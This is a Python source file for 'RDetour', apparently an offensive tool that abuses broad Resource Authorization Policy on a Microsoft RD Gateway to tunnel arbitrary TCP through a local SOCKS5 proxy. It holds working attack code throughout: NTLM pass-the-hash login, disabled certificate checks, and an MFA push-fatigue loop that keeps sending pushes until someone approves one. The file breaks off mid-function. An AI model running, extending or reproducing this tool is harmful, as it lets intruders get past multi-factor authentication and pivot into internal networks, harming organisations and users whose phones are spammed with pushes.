#!/usr/bin/env python3
"""RDetour — RD Gateway (MS-TSGU) to SOCKS5.

Exploits broad RAP (Resource Authorization Policy) to tunnel arbitrary TCP
through an RD Gateway. One MFA push per tunnel lifetime, then unlimited
proxied connections via channel cycling.

Protocol per [MS-TSGU] HTTP transport, cross-checked against FreeRDP rdg.c.
"""
import argparse
import base64
import collections
import hashlib
import json
import os
import random
import re
import socket
import ssl
import struct
import sys
import tempfile
import threading
import time
import uuid

MAX_PACKET = 0x20000
CLOSE_GRACE_S = 0.4
ABRUPT_CLOSE_GRACE_S = 2.0
SNIFF_S = 10.0
STILLBORN_S = 3.0
REFUSED_CACHE_TTL_S = 7 * 86400

HRESULTS = {
    0x80070005: "E_ACCESSDENIED",
    0x80075934: "E_PROXY_INTERNALERROR",
    0x80075935: "E_PROXY_NOCERT",
    0x80075936: "E_PROXY_UNSUPPORTED_VERSION",
    0x80075938: "E_PROXY_RAP_ACCESSDENIED",
    0x80075939: "E_PROXY_QUARANTINE_ACCESSDENIED",
    0x8007593D: "E_PROXY_CAPABILITYNOTSUPPORTED",
    0x8007593E: "E_PROXY_CONNECTIONABORTED",
    0x8007593F: "E_PROXY_RAP_NOTFOUND",
    0x80075940: "E_PROXY_TIMER_EXPIRED",
    0x8007274C: "ERROR_CONNECTION_REFUSED",
    0x80072726: "ERROR_CONNECTION_RESET",
    0x800759D8: "CHANNEL_IO_ABORT (win32 23000 — channel IO failed; "
                 "the target closed/reset the connection)",
    0x800759DB: "CAP_DENIED (win32 23003)",
    0x800759DD: "E_PROXY_TARGET_UNREACHABLE (win32 23005)",
}


def hresult_name(code):
    return HRESULTS.get(code, "win32=%d" % (code & 0xFFFF))


class RDGError(Exception):
    """Base; message is operator-facing."""


class RDGAuthError(RDGError):
    """HTTP leg auth failure (bad creds, no Negotiate challenge, 403)."""


class MfaNotApproved(RDGError):
    """Tunnel-auth stage denied or timed out — MFA pending/denied. Retryable."""


class RDGPolicyError(RDGError):
    """CAP/RAP policy denial."""


class RDGUnreachableError(RDGError):
    """No channel response — gateway-side connect() to the target stalled
    (observed against real RDG: unroutable targets hold the channel silent
    past any sane client window)."""


class RDGProtocolError(RDGError):
    """Malformed/foreign response."""

    def __init__(self, msg, code=None):
        super().__init__("%s (%s)" % (msg, hresult_name(code)) if code else msg)
        self.code = code


def u16(x):
    return struct.pack("<H", x)


def u32(x):
    return struct.pack("<I", x)


def utf16z(s):
    return s.encode("utf-16-le") + b"\x00\x00"


def pkt(ptype, payload=b""):
    return u16(ptype) + u16(0) + struct.pack("<I", 8 + len(payload)) + payload


def chunk(b):
    return ("%x\r\n" % len(b)).encode() + b + b"\r\n"


def smb2_negotiate():
    hdr = (b"\xfeSMB" + u16(64) + u16(0) + u32(0) + u16(0) + u16(0) +
           u32(0) + u32(0) + b"\x00" * 8 + u32(0xFEFF) + u32(0) +
           b"\x00" * 8 + b"\x00" * 16)
    neg = (u16(36) + u16(3) + u16(1) + u16(0) + u32(0) + b"\x11" * 16 +
           u32(0) + u16(0) + u16(0) + u16(0x0202) + u16(0x0210) + u16(0x0300))
    msg = hdr + neg
    assert len(hdr) == 64
    return b"\x00" + struct.pack(">I", len(msg))[1:] + msg


def channel_create_body(names, port, protocol):
    """HTTP_CHANNEL_PACKET body per MS-TSGU. Multiple PRIMARY names use the
    gateway's pick-live behavior: [target, 127.0.0.1] can never be denied."""
    if isinstance(names, str):
        names = [names]
    body = struct.pack("<BB", len(names), 0) + u16(port) + u16(protocol)
    for h in names:
        name = utf16z(h)
        body += u16(len(name)) + name
    return body


def smb2_server_guid(buf):
    """ServerGUID from an SMB2 NEGOTIATE response, or None."""
    if len(buf) < 92 or buf[4:8] != b"\xfeSMB":
        return None
    return buf[76:92]


def smb1_probe(buf):
    """True if buf is impacket's single-dialect SMB1 negotiate probe.
    Forwarded through RDG, the server RST kills the tunnel — answer locally."""
    if len(buf) < 36 or buf[0] != 0x00:            # NBSS session message
        return False
    if 4 + int.from_bytes(buf[1:4], "big") != len(buf):
        return False          # partial/concatenated framing — not the probe
    if buf[4:8] != b"\xffSMB" or buf[8] != 0x72:   # SMB1 NEGOTIATE
        return False
    return b"NT LM 0.12" in buf and b"SMB 2" not in buf


def rst(sock):
    """Close with RST (SO_LINGER 0)."""
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                        struct.pack("ii", 1, 0))
    except OSError:
        pass
    try:
        sock.close()
    except OSError:
        pass


def tls_server_end_point_hash(der):
    # RFC 5929 channel binding hash.
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes
        alg = x509.load_der_x509_certificate(der).signature_hash_algorithm
        if isinstance(alg, (hashes.MD5, hashes.SHA1)):
            return hashlib.sha256(der).digest()
        h = hashes.Hash(alg)
        h.update(der)
        return h.finalize()
    except Exception:
        return hashlib.sha256(der).digest()


class HTTPResponse:
    def __init__(self, status, headers, rest=b""):
        self.status = status
        self.headers = headers
        self.rest = rest

    def header(self, name, default=None):
        vals = self.headers.get(name.lower())
        return vals[-1] if vals else default

    def all_headers(self, name):
        return self.headers.get(name.lower(), [])


class RawTLS:
    def __init__(self, host, port, timeout=15):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        self.sock = socket.create_connection((host, port), timeout=timeout)
        try:
            self.tls = ctx.wrap_socket(self.sock, server_hostname=host)
        except Exception:
            self.sock.close()
            raise
        self.tls.settimeout(timeout)
        self.buf = b""
        try:
            der = self.tls.getpeercert(binary_form=True)
            self.app_data = b"tls-server-end-point:" + tls_server_end_point_hash(der)
        except Exception:
            self.app_data = None

    def send(self, b):
        self.tls.sendall(b)

    def recv(self, n=4096, timeout=None):
        if self.buf:
            out, self.buf = self.buf[:n], self.buf[n:]
            return out
        if timeout is not None:
            self.tls.settimeout(timeout)
        return self.tls.recv(n)

    def read_http_response(self):
        while b"\r\n\r\n" not in self.buf:
            d = self.tls.recv(65536)
            if not d:
                raise RDGProtocolError("EOF during HTTP response head")
            self.buf += d
        head, self.buf = self.buf.split(b"\r\n\r\n", 1)
        lines = head.decode("latin1").split("\r\n")
        status = int(lines[0].split(" ")[1])
        headers = {}
        for ln in lines[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1)
                headers.setdefault(k.strip().lower(), []).append(v.strip())
        cl = headers.get("content-length")
        if cl and "transfer-encoding" not in headers and status != 200:
            need = int(cl[-1])
            while len(self.buf) < need:
                d = self.tls.recv(65536)
                if not d:
                    break
                self.buf += d
            self.buf = self.buf[need:]
        return HTTPResponse(status, headers, self.buf)

    def close(self):
        try:
            self.tls.close()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass


class ChunkedReader:
    def __init__(self, tls):
        self.tls = tls
        self.pending = b""
        self.eof = False

    def _read_line(self):
        while b"\r\n" not in self.pending:
            d = self.tls.recv(65536)
            if not d:
                raise RDGProtocolError("EOF in chunk header")
            self.pending += d
        line, self.pending = self.pending.split(b"\r\n", 1)
        return line

    def read(self, n):
        out = b""
        while len(out) < n and not self.eof:
            if not self.pending:
                size = int(self._read_line().split(b";")[0], 16)
                if size == 0:
                    self._read_line()
                    self.eof = True
                    break
                while len(self.pending) < size:
                    d = self.tls.recv(65536)
                    if not d:
                        raise RDGProtocolError("EOF in chunk body")
                    self.pending += d
                # extract chunk body, keep overflow, consume trailing CRLF
                chunk = self.pending[:size]
                self.pending = self.pending[size:]
                self._read_line()          # trailing CRLF after chunk body
                self.pending = chunk + self.pending
            take = min(n - len(out), len(self.pending))
            out += self.pending[:take]
            self.pending = self.pending[take:]
        return out


class RDGTunnel:
    """One tunnel (OUT + IN TLS legs) with one channel at a time.
    Authenticated once (MFA fires here), then channels cycle freely."""

    EXT_AUTH_NONE = 0x0
    EXT_AUTH_SC = 0x1
    EXT_AUTH_PAA = 0x2
    EXT_AUTH_SSPI_NTLM = 0x4

    def __init__(self, gateway, gport=443, domain=None, user=None, password=None,
                 nthash=None, path="/remoteDesktopGateway/", client_name=None,
                 connect_timeout=15, verbose=False, ext_auth="none",
                 paa_cookie=None, session_jar=None):
        self.gateway = gateway
        self.gport = gport
        self.path = path
        self.verbose = verbose
        self.ext_auth = {"none": self.EXT_AUTH_NONE,
                         "sc": self.EXT_AUTH_SC,
                         "paa": self.EXT_AUTH_PAA,
                         "sspi_ntlm": self.EXT_AUTH_SSPI_NTLM}[ext_auth]
        self.paa_cookie = paa_cookie
        self._session_jar = session_jar
        if session_jar is not None and session_jar.get("conn_id"):
            self.conn_id = session_jar["conn_id"]
            self.corr_id = session_jar["corr_id"]
        else:
            self.conn_id = str(uuid.uuid4()).upper()
            self.corr_id = str(uuid.uuid4()).upper()
        self.client_name = (client_name or socket.gethostname())[:15]
        self._cbt = {}
        if session_jar is not None and session_jar.get("cookies"):
            self._cookies = list(session_jar["cookies"])
        else:
            self._cookies = []
        self.out_tls = self.in_tls = None
        self.out_reader = None
        self.closed = False
        self.out_dead = False
        self.last_srv_close_reason = None
        self.last_close_ts = 0.0
        self.last_close_abrupt = False
        self.suspect = False
        self.drain_saw_data = False
        self.channel_open = False
        self._srv_closed_channel = False
        self._srv_close_ptype = None
        self._ka_stop = threading.Event()
        try:
            import spnego
            from spnego.channel_bindings import GssChannelBindings
        except ImportError:
            raise RDGError("pyspnego required: pip install pyspnego")
        secret = ("%s:%s" % ("aad3b435b51404eeaad3b435b51404ee", nthash)
                  if nthash else password)
        self._spnego = spnego
        self._cb_cls = GssChannelBindings
        self._ident = (user, secret, domain, gateway)

    def log(self, *a):
        if self.verbose:
            print("[rdg]", *a, file=sys.stderr, flush=True)

    def _request(self, method, auth_hdr=None, chunked=False):
        lines = [
            "%s %s HTTP/1.1" % (method, self.path),
            "Host: %s" % self.gateway,
            "Pragma: no-cache",
            "Accept: */*",
            "Cache-Control: no-cache",
            "Connection: Keep-Alive",
            "User-Agent: MS-RDGateway/1.0",
        ]
        if self._cookies:
            lines.append("Cookie: " + "; ".join(self._cookies))
        lines.append("Transfer-Encoding: chunked" if chunked
                     else "Content-Length: 0")
        if self.ext_auth != self.EXT_AUTH_NONE:
            schemes = {self.EXT_AUTH_PAA: "PAA",
                       self.EXT_AUTH_SSPI_NTLM: "SSPI_NTLM"}
            lines.append("RDG-Auth-Scheme: %s" % schemes[self.ext_auth])
        elif auth_hdr:
            lines.append("Authorization: Negotiate %s" % auth_hdr)
        lines.append("RDG-Connection-Id: {%s}" % self.conn_id)
        lines.append("RDG-Correlation-Id: {%s}" % self.corr_id)
        return ("\r\n".join(lines) + "\r\n\r\n").encode("latin1")

    def _grab_cookies(self, resp):
        for c in resp.all_headers("set-cookie"):
            pair = c.split(";", 1)[0].strip()
            if pair and pair not in self._cookies:
                self._cookies.append(pair)

    def _establish_leg(self, method):
        tls = RawTLS(self.gateway, self.gport)
        if tls.app_data and "app_data" not in self._cbt:
            self._cbt["app_data"] = tls.app_data
        if self.ext_auth != self.EXT_AUTH_NONE:
            tls.send(self._request(method))
            resp = tls.read_http_response()
            self._grab_cookies(resp)
            if resp.status != 200:
                tls.close()
                raise RDGAuthError("%s leg (ext-auth %s) HTTP %d (www-auth: %r)"
                                   % (method, self.ext_auth, resp.status,
                                      resp.all_headers("www-authenticate")))
            return tls, resp
        user, secret, domain, spn_host = self._ident
        cb = (self._cb_cls(application_data=self._cbt["app_data"])
              if self._cbt.get("app_data") else None)
        ctx = self._spnego.client(
            user, secret, service="http", hostname=spn_host, domain=domain,
            protocol="negotiate", channel_bindings=cb,
            options=self._spnego.NegotiateOptions.use_ntlm)
        tls.send(self._request(method,
                               auth_hdr=base64.b64encode(ctx.step()).decode()))
        resp = tls.read_http_response()
        self._grab_cookies(resp)
        if resp.status == 401:
            blob = None
            for tok in resp.all_headers("www-authenticate"):
                if tok.startswith(("Negotiate ", "NTLM ")):
                    blob = base64.b64decode(tok.split(" ", 1)[1].strip())
                    break
            if blob is None:
                tls.close()
                raise RDGAuthError("no NTLM challenge (www-auth: %r)"
                                   % resp.all_headers("www-authenticate"))
            tls.send(self._request(method,
                                   auth_hdr=base64.b64encode(ctx.step(blob)).decode()))
            resp = tls.read_http_response()
            self._grab_cookies(resp)
        if resp.status != 200:
            tls.close()
            raise RDGAuthError("%s leg HTTP %d (www-auth: %r)"
                               % (method, resp.status,
                                  resp.all_headers("www-authenticate")))
        return tls, resp

    def establish(self, auth_timeout=15):
        """Legs + handshake + tunnel create/auth. MFA fires here."""
        if self._cookies:
            self.log("session reuse: seeding %d cookies + conn %s"
                     % (len(self._cookies), self.conn_id[:8]))
        self.out_tls, out_resp = self._establish_leg("RDG_OUT_DATA")
        if (out_resp.header("transfer-encoding", "") or "").lower() == "chunked":
            self.out_tls.buf = out_resp.rest
            self.out_reader = ChunkedReader(self.out_tls)
        else:
            self.out_tls.buf = out_resp.rest
            self.out_reader = self.out_tls
        self._skip_seed()

        self.in_tls, _in_resp = self._establish_leg("RDG_IN_DATA")
        self.in_tls.send(self._request("RDG_IN_DATA", chunked=True))

        self._handshake()
        if self.ext_auth == self.EXT_AUTH_SSPI_NTLM:
            self._extauth_sspi_exchange()
        self._tunnel_create()
        self._tunnel_auth(auth_timeout)
        if self._session_jar is not None:
            self._session_jar["cookies"] = list(self._cookies)
            self._session_jar["conn_id"] = self.conn_id
            self._session_jar["corr_id"] = self.corr_id
        threading.Thread(target=self._keepalive_loop, daemon=True).start()
        return self

    def open_channel(self, hosts, port, protocol=3):
        """Bind the tunnel's channel to host:port. No MFA — just RAP check."""
        grace = (ABRUPT_CLOSE_GRACE_S if getattr(self, "last_close_abrupt",
                                                 False) else CLOSE_GRACE_S)
        gap = time.monotonic() - getattr(self, "last_close_ts", 0)
        if 0 < gap < grace:
            time.sleep(grace - gap)
        self._channel_create(hosts, port, protocol)
        self.channel_open = True
        self._srv_closed_channel = False
        self._srv_close_ptype = None
        self.last_srv_close_reason = None
        return self

    def close_channel(self, timeout=8):
        """CLOSE_CHANNEL(0) so the tunnel can carry a new CHANNEL_CREATE."""
        if not self.channel_open:
            return
        self.channel_open = False
        self._close_channel_xchg(timeout)

    def _close_channel_xchg(self, timeout=8):
        """CLOSE_CHANNEL(0) -> 0x11 ack. Drains in-flight data first."""
        for _ in range(2):
            dp = self.recv_packet(timeout=0.2)
            if dp is None:
                break
            if dp[0] == 0xA:
                self.drain_saw_data = True
        try:
            self.send_packet(pkt(0x10, u32(0)))
            p = self.recv_packet(timeout=timeout)
            self.log("close-channel ack: %s" % (p and hex(p[0])))
        except (ConnectionError, ssl.SSLError) as e:
            self.closed = True
            self.suspect = True
            raise RDGError("tunnel died closing channel: %r" % e)
        if p is None or p[0] != 0x11:
            self.closed = True
            self.suspect = True
            raise RDGProtocolError("no close-channel ack — tunnel suspect")
        self.last_close_ts = time.monotonic()

    def connect_tunnel(self, host, port, protocol=3, auth_timeout=15):
        """One-shot establish + channel (check mode)."""
        self.establish(auth_timeout)
        self.open_channel(host, port, protocol)
        return True

    def _out_read_one(self, n):
        if isinstance(self.out_reader, ChunkedReader):
            return self.out_reader.read(n)
        return self.out_tls.recv(n)

    def _out_fill(self, n, timeout=10):
        while len(self.out_tls.buf) < n:
            if isinstance(self.out_reader, ChunkedReader):
                d = self.out_reader.read(n - len(self.out_tls.buf))
            else:
                d = self.out_tls.recv(65536, timeout=timeout)
            if not d:
                raise RDGProtocolError("EOF on OUT stream")
            self.out_tls.buf += d

    def _skip_seed(self):
        # MS-TSGU 3.3.5.1: 10-byte random seed precedes the first packet.
        while len(self.out_tls.buf) < 10:
            try:
                d = self._out_read_one(10 - len(self.out_tls.buf))
            except socket.timeout:
                raise RDGProtocolError("seed payload incomplete (timeout)")
            if not d:
                raise RDGProtocolError("EOF reading seed payload")
            self.out_tls.buf += d
        seed = self.out_tls.buf[:10]
        self.out_tls.buf = self.out_tls.buf[10:]
        self.log("seed skipped: %s" % seed.hex())

    def _handshake(self):
        self.send_packet(pkt(0x1, b"\x01\x00" + u16(0) + u16(self.ext_auth)))
        ptype, body = self._expect_packet(0x2)
        err = struct.unpack("<I", body[0:4])[0]
        if err:
            raise RDGProtocolError("handshake refused", err)
        self.server_ext_auth = struct.unpack("<H", body[8:10])[0]
        self.log("handshake ok (server ver %d.%d, advertises ext-auth 0x%x)"
                 % (body[4], body[5], self.server_ext_auth))

    def _extauth_sspi_exchange(self):
        user, secret, domain, spn_host = self._ident
        cb = (self._cb_cls(application_data=self._cbt["app_data"])
              if self._cbt.get("app_data") else None)
        ctx = self._spnego.client(
            user, secret, service="http", hostname=spn_host, domain=domain,
            protocol="ntlm", channel_bindings=cb,
            options=self._spnego.NegotiateOptions.use_ntlm)
        token = ctx.step()
        while True:
            self.send_packet(pkt(0x3, u32(0) + u16(len(token)) + token))
            ptype, body = self.recv_packet(timeout=30)
            if ptype is None or ptype != 0x3:
                raise RDGAuthError("ext-auth sspi: no/bad reply (got %r)"
                                   % (ptype,))
            err, blen = struct.unpack("<IH", body[0:6])
            if err:
                raise RDGAuthError("ext-auth sspi failed: %s" % hresult_name(err))
            if blen == 0:
                self.log("ext-auth sspi accepted")
                return
            token = ctx.step(body[6:6 + blen])
            if token is None:
                raise RDGAuthError("ext-auth sspi: context done but server "
                                   "expects another token")

    def _tunnel_create(self):
        caps = 0x1 | 0x4 | 0x8  # QUAR_SOH | CONSENT_SIGN | SERVICE_MSG
        if self.ext_auth == self.EXT_AUTH_PAA:
            if not self.paa_cookie:
                raise RDGError("ext-auth paa requires --paa-cookie")
            cookie = utf16z(self.paa_cookie)
            self.send_packet(pkt(0x4, u32(caps) + u16(1) + u16(0) +
                                 u16(len(cookie)) + cookie))
        else:
            self.send_packet(pkt(0x4, u32(caps) + u16(0) + u16(0)))
        ptype, body = self._expect_packet(0x5)
        err = struct.unpack("<I", body[2:6])[0]
        if err:
            raise RDGPolicyError("tunnel create denied: %s" % hresult_name(err))

    def _tunnel_auth(self, auth_timeout):
        name = utf16z(self.client_name)
        self.send_packet(pkt(0x6, u16(0) + u16(len(name)) + name))
        p = self.recv_packet(timeout=auth_timeout)
        if p is None or p[0] != 0x7:
            raise MfaNotApproved("tunnel auth: no response in %ds (MFA pending?)"
                                 % auth_timeout)
        err = struct.unpack("<I", p[1][0:4])[0]
        if err == 0x80075939:  # quarantine denied — FreeRDP tolerates
            self.log("tunnel auth quarantine-tolerated")
            return
        if err:
            raise MfaNotApproved("tunnel auth denied: %s" % hresult_name(err))
        self.log("tunnel authorized")

    def _channel_create(self, names, port, protocol):
        shown = names if isinstance(names, list) else [names]
        t0 = time.monotonic()
        self.send_packet(pkt(0x8, channel_create_body(names, port,
                                                      protocol)))
        p = self.recv_packet(timeout=25)
        if p is None:
            if self.out_dead:
                raise RDGUnreachableError(
                    "tunnel torn down before/while creating channel to %s "
                    "(OUT leg dead%s — a previous channel's target likely "
                    "closed/reset the connection)"
                    % (":".join("%s:%d" % (h, port) for h in shown),
                       ", abort 0x%08x" % self.last_srv_close_reason
                       if self.last_srv_close_reason else ""))
            raise RDGUnreachableError(
                "no channel response (waited %.0fs) — target %s likely "
                "unreachable from the gateway"
                % (time.monotonic() - t0,
                   ":".join("%s:%d" % (h, port) for h in shown)))
        if p[0] != 0x9:
            raise RDGProtocolError("bad channel response: got packet 0x%x"
                                   % p[0])
        err = struct.unpack("<I", p[1][0:4])[0]
        if err:
            raise RDGPolicyError("channel to %s denied: %s"
                                 % (",".join(shown), hresult_name(err)))
        self.log("channel up %s" % ",".join(shown))

    def _expect_packet(self, want):
        p = self.recv_packet()
        if p is None or p[0] != want:
            raise RDGProtocolError("expected packet 0x%x, got %r%s"
                                   % (want, p and p[0],
                                      " (OUT leg dead)" if self.out_dead
                                      else ""))
        return p

    def send_packet(self, raw):
        self.in_tls.send(chunk(raw))

    def write(self, data):
        off = 0
        while off < len(data):
            part = data[off:off + 0xFFFF]
            self.send_packet(pkt(0xA, u16(len(part)) + part))
            off += len(part)

    def recv_packet(self, timeout=15):
        try:
            self._out_fill(8, timeout)
        except socket.timeout:
            return None
        except (ConnectionError, ssl.SSLError, RDGProtocolError):
            self.out_dead = True
            self.closed = True
            return None
        hdr = self.out_tls.buf[:8]
        self.out_tls.buf = self.out_tls.buf[8:]
        ptype, _rsvd, plen = struct.unpack("<HHI", hdr)
        if plen > MAX_PACKET:
            raise RDGProtocolError("packet length 0x%x out of range" % plen)
        body = b""
        if plen > 8:
            try:
                self._out_fill(plen - 8, timeout)
            except socket.timeout:
                if ptype == 0xA:
                    self.drain_saw_data = True
                return None
            except (ConnectionError, ssl.SSLError, RDGProtocolError):
                self.out_dead = True
                self.closed = True
                if ptype == 0xA:
                    self.drain_saw_data = True
                return None
            body = self.out_tls.buf[:plen - 8]
            self.out_tls.buf = self.out_tls.buf[plen - 8:]
        return (ptype, body)

    def read(self, timeout=15):
        while not self.closed:
            p = self.recv_packet(timeout)
            if p is None:
                return None
            ptype, body = p
            if ptype == 0xA:
                if len(body) < 2:
                    return b""
                return body[2:2 + struct.unpack("<H", body[:2])[0]]
            if ptype == 0xD:  # keepalive
                continue
            if ptype in (0x10, 0x11):  # close channel (either direction)
                self.channel_open = False
                self._srv_closed_channel = True
                self._srv_close_ptype = ptype
                if len(body) >= 4:
                    self.last_srv_close_reason = struct.unpack(
                        "<I", body[0:4])[0]
                    if self.last_srv_close_reason == 0x800759D8:
                        self.closed = True
                        self.log("0x800759d8 — tunnel dead")
                return None
            self.log("packet 0x%x ignored" % ptype)
        return None

    def _keepalive_loop(self):
        while not self._ka_stop.wait(30):
            try:
                self.send_packet(pkt(0xD))
            except Exception:
                self.closed = True
                return

    def close(self):
        self._ka_stop.set()
        self.closed = True
        try:
            self.send_packet(pkt(0x10, u32(0xFFFFFFFE)))
        except Exception:
            pass
        for t in (self.out_tls, self.in_tls):
            if t:
                t.close()


def say(*a):
    print(*a, file=sys.stderr, flush=True)


class SocksServer:
    def __init__(self, args, tunnel_factory):
        self.args = args
        self.factory = tunnel_factory
        self.stats = {"opened": 0, "failed": 0, "pushes": 0}
        self.establish_lock = threading.Lock()
        self.mfa_gate = threading.Event()
        self.mfa_lock = threading.Lock()
        self.mfa_dead = False
        self.mfa_hinted = False
        self._conn_seq = 0
        self._conn_lock = threading.Lock()

    def _next_conn(self):
        with self._conn_lock:
            self._conn_seq += 1
            return self._conn_seq

    def reply(self, client, rep):
        client.sendall(b"\x05" + bytes([rep]) + b"\x00\x01" +
                       b"\x7f\x00\x00\x01" + struct.pack(">H", 0))

    def _recv_exact(self, client, n):
        buf = b""
        while len(buf) < n:
            d = client.recv(n - len(buf))
            if not d:
                raise ConnectionError("SOCKS client EOF")
            buf += d
        return buf

    def _negotiate(self, client):
        """Returns (host, port) or None after replying/closing itself."""
        client.settimeout(60)
        try:
            hdr = self._recv_exact(client, 2)
            if hdr[0] != 0x05:
                return None
            methods = self._recv_exact(client, hdr[1])
            if 0x00 not in methods:
                self.reply(client, 0xFF)
                return None
            client.sendall(b"\x05\x00")
            req = self._recv_exact(client, 4)
            if req[1] != 0x01:
                self.reply(client, 0x07)  # CONNECT only
                return None
            atyp = req[3]
            if atyp == 0x01:
                raw = self._recv_exact(client, 6)
                host = socket.inet_ntoa(raw[:4])
                port = struct.unpack(">H", raw[4:6])[0]
            elif atyp == 0x03:
                hlen = self._recv_exact(client, 1)[0]
                if not 1 <= hlen <= 255:
                    return None
                raw = self._recv_exact(client, hlen + 2)
                host = raw[:hlen].decode("latin1")
                port = struct.unpack(">H", raw[hlen:])[0]
            elif atyp == 0x04:
                raw = self._recv_exact(client, 18)
                host = socket.inet_ntop(socket.AF_INET6, raw[:16])
                port = struct.unpack(">H", raw[16:18])[0]
            else:
                self.reply(client, 0x08)
                return None
            return host, port
        except (ConnectionError, socket.timeout):
            return None

    def _fatigue_loop(self, host, port):
        a = self.args
        attempt = 0
        while True:
            attempt += 1
            self.stats["pushes"] += 1
            wait = a.mfa_interval
            if a.mfa_jitter:
                wait += random.randint(-a.mfa_jitter, a.mfa_jitter)
            print("[fatigue] push %d (approve on the phone; %ds window)..."
                  % (attempt, a.mfa_auth_timeout), file=sys.stderr, flush=True)
            try:
                t = self.factory(host, port, auth_timeout=a.mfa_auth_timeout)
                print("[fatigue] approved on push %d — tunnel live" % attempt,
                      file=sys.stderr, flush=True)
                self.mfa_gate.set()
                return t
            except MfaNotApproved as e:
                if a.mfa_max and attempt >= a.mfa_max:
                    raise RDGError("fatigue: %d pushes exhausted (%s)"
                                   % (a.mfa_max, e))
                print("[fatigue] %s — next push in %ds" % (e, max(wait, 1)),
                      file=sys.stderr, flush=True)
                time.sleep(max(wait, 1))

    def _connect(self, host, port, conn_id):
        a = self.args
        with self.establish_lock:
            if not a.mfa_fatigue:
                say("[conn %d] opening tunnel to %s:%d (auth window %ds — "
                    "approve the push if the gateway prompts)"
                    % (conn_id, host, port, a.auth_timeout))
                return self.factory(host, port, auth_timeout=a.auth_timeout)
            with self.mfa_lock:
                if self.mfa_dead:
                    raise RDGError("fatigue already failed permanently")
                if not self.mfa_gate.is_set():
                    try:
                        return self._fatigue_loop(host, port)
                    except MfaNotApproved:
                        raise
                    except RDGError:
                        self.mfa_dead = True
                        raise
            for i in range(3):
                say("[conn %d] push sent for this connection — approve it "
                    "(%ds)" % (conn_id, a.mfa_auth_timeout))
                try:
                    return self.factory(host, port,
                                        auth_timeout=a.mfa_auth_timeout)
                except MfaNotApproved:
                    if i == 2:
                        raise
                    time.sleep(5)

    def handle(self, client):
        t = None
        try:
            target = self._negotiate(client)
            if target is None:
                return
            host, port = target
            conn_id = self._next_conn()
            self.args.log("CONNECT %s:%d" % (host, port))
            t = self._connect(host, port, conn_id)
            self.reply(client, 0x00)
            self.stats["opened"] += 1
            say("[conn %d] tunnel live · channel %s:%d" %
                (conn_id, host, port))

            def reader():
                try:
                    while not t.closed and t.channel_open:
                        d = t.read(timeout=15)
                        if d:
                            client.sendall(d)
                        elif t.closed or not t.channel_open:
                            break
                except Exception:
                    pass
                try:
                    client.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass

            threading.Thread(target=reader, daemon=True).start()
            client.settimeout(None)
            while not t.closed and t.channel_open:
                d = client.recv(65536)
                if not d:
                    break
                t.write(d)
        except MfaNotApproved as e:
            self.stats["failed"] += 1
            self.stats["pushes"] += 1
            self.fail(client, 0x02, "mfa not approved: %s" % e)
            if not self.mfa_hinted:
                self.mfa_hinted = True
                say("[hint] gateway is MFA-gated — try --mfa-fatigue")
        except RDGPolicyError as e:
            self.stats["failed"] += 1
            self.fail(client, 0x02, "policy: %s" % e)
        except RDGAuthError as e:
            self.stats["failed"] += 1
            self.fail(client, 0x01, "auth: %s" % e)
        except RDGUnreachableError as e:
            self.stats["failed"] += 1
            self.fail(client, 0x03, "unreachable via gateway: %s" % e)
        except RDGError as e:
            self.stats["failed"] += 1
            self.fail(client, 0x01, "tunnel: %s" % e)
        except (ConnectionError, socket.timeout, OSError) as e:
            self.stats["failed"] += 1
            self.fail(client, 0x03, "network: %r" % e)
        finally:
            if t:
                t.close()
            try:
                client.close()
            except Exception:
                pass

    def fail(self, client, rep, msg):
        print("[!]", msg, file=sys.stderr, flush=True)
        try:
            self.reply(client, rep)
        except Exception:
            pass

    def serve(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.args.socks_host, self.args.socks_port))
        srv.listen(16)
        mode = ""
        if self.args.mfa_fatigue:
            mode = " [mfa-fatigue %ds%s]" % (
                self.args.mfa_interval,
                ", max %d" % self.args.mfa_max if self.args.mfa_max else "")
        print("[*] SOCKS5 %s:%d via %s:%d as %s%s" %
              (self.args.socks_host, self.args.socks_port, self.args.gateway,
               self.args.gport, self.args.ident_label, mode), flush=True)
        try:
            while True:
                c, _ = srv.accept()
                threading.Thread(target=self.handle, args=(c,), daemon=True).start()
        except KeyboardInterrupt:
            print("\n[*] opened=%d failed=%d pushes=%d" %
                  (self.stats["opened"], self.stats["failed"],
                   self.stats["pushes"]))


def refused445_cache_path(gateway):
    name = re.sub(r"[^a-z0-9.-]+", "-", gateway.lower())
    d = os.environ.get("RDETOUR_CACHE_DIR", os.path.expanduser("~/.rdetour"))
    return os.path.join(d, "refused445-%s-%s.json" %
                        (name, hashlib.sha1(
                            gateway.encode("utf-8")).hexdigest()[:8]))


def load_refused445(gateway):
    """Legacy v1 refused-445 cache loader. Used by migration and tests."""
    path = refused445_cache_path(gateway)
    try:
        with open(path, "r") as f:
            doc = json.load(f)
        entries = doc.get("refused445") if isinstance(doc, dict) else None
        if not isinstance(entries, dict):
            entries = {}
    except FileNotFoundError:
        return set()
    except (OSError, ValueError) as e:
        say("[warm] refused-445 cache unreadable (%s) — starting empty" % e)
        return set()
    now = time.time()
    live = {}
    for h, ts in entries.items():
        if isinstance(ts, (int, float)) and now - ts < REFUSED_CACHE_TTL_S:
            live[h] = min(ts, now)     # future ts -> now, so it ages out
    if len(live) != len(entries):
        try:
            save_refused445(gateway, live)
        except OSError as e:
            say("[warm] refused-445 cache rewrite failed (%s)" % e)
    return set(live)


def save_refused445(gateway, entries):
    """Legacy v1 cache writer. Atomic mkstemp + os.replace."""
    path = refused445_cache_path(gateway)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    fd, tmp = tempfile.mkstemp(dir=os.path.dirname(path),
                               prefix=os.path.basename(path) + ".",
                               suffix=".tmp")
    try:
        with os.fdopen(fd, "w") as f:
            json.dump({"version": 1, "gateway": gateway,
                       "refused445": entries}, f)
        os.replace(tmp, path)
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def kill_cache_path(gateway):
    name = re.sub(r"[^a-z0-9.-]+", "-", gateway.lower())
